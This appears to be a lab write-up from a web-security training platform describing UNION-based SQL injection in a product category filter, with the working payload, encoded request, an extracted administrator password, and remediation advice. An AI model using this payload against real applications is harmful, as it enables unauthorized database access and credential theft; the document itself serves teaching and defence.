````md
# SQL Injection via UNION Attack in Category Filter Parameter

## Summary

A SQL Injection vulnerability was identified in the `category` parameter of the product filtering functionality. The application directly incorporates user-supplied input into SQL queries without proper sanitization or parameterization.

This allows an attacker to manipulate the SQL query using a UNION-based payload and extract sensitive data from backend database tables, including administrator credentials.

---

## Vulnerability Details

| Field                  | Value                                      |
| ---------------------- | ------------------------------------------ |
| Vulnerability Type     | SQL Injection (UNION-based)                |
| Severity               | Critical                                   |
| Affected Functionality | Product Category Filter                    |
| Parameter              | `category`                                 |
| Attack Vector          | HTTP GET Parameter                         |
| Impacted Data          | User credentials (username, password)      |

---

## Description

The application uses the `category` parameter to filter products. However, the input is directly concatenated into the SQL query without proper validation or parameterized queries.

This allows an attacker to:
- Break out of the intended query context
- Inject UNION SELECT statements
- Retrieve data from other database tables

---

## Source

### Vulnerable Request

The application accepts input through the `category` parameter:

```http
GET /filter?category=<user_input>
````

Example payload used:

```
Accessories' UNION SELECT username,password FROM users--
```

Encoded request:

```
https://0ad8001703f583de80acdfe000210016.web-security-academy.net/filter?category=Accessories%27UNION%20SELECT%20username,password%20FROM%20users--
```

---

## Sink

The input is directly inserted into an SQL query such as:

```sql
SELECT * FROM products WHERE category = 'USER_INPUT'
```

Due to lack of sanitization, the query becomes:

```sql
SELECT * FROM products WHERE category = 'Accessories'
UNION SELECT username, password FROM users--
```

This allows merging results from the `users` table with the original query output.

---

## Exploitation Technique

### UNION-Based SQL Injection

The attacker uses UNION SELECT to combine results from multiple tables:

```sql
' UNION SELECT username,password FROM users--
```

This technique works when:

* Column count matches original query
* Data types are compatible
* Output is reflected in response

---

## Proof of Concept

### Request

```http
GET /filter?category=Accessories' UNION SELECT username,password FROM users--
```

---

### Encoded Request

```
https://0ad8001703f583de80acdfe000210016.web-security-academy.net/filter?category=Accessories%27UNION%20SELECT%20username,password%20FROM%20users--
```

---

### Response (Extracted Data)

| username      | password             |
| ------------- | -------------------- |
| administrator | mt8ieb7csdhdj6pjbxxx |

---

## Impact

Successful exploitation leads to:

* Extraction of sensitive user credentials
* Exposure of administrator accounts
* Potential authentication bypass
* Full compromise of application depending on privilege level
* Access to backend database structure

---

## Root Cause

* Direct concatenation of user input into SQL queries
* Lack of parameterized queries (prepared statements)
* No input validation on `category` parameter
* Database results directly reflected in HTTP response

---

## Remediation

### 1. Use Parameterized Queries

```sql
SELECT * FROM products WHERE category = ?
```

---

### 2. Input Validation

* Allow only predefined category values
* Reject unexpected characters such as `'`, `--`, `UNION`

---

### 3. Least Privilege Database Access

* Restrict database user permissions
* Prevent access to sensitive tables like `users`

---

### 4. Disable Direct Error Output

* Avoid leaking SQL errors to client

---

### 5. Use ORM Layer

* Avoid raw SQL concatenation in application logic

---

### 6. Web Application Firewall (WAF)

* Detect and block UNION-based injection patterns

---

## Conclusion

The `category` parameter is vulnerable to UNION-based SQL Injection, allowing extraction of sensitive user data from the database. Exploitation confirmed retrieval of administrator credentials.

Proper use of parameterized queries and strict input validation fully mitigates this vulnerability.

```
```
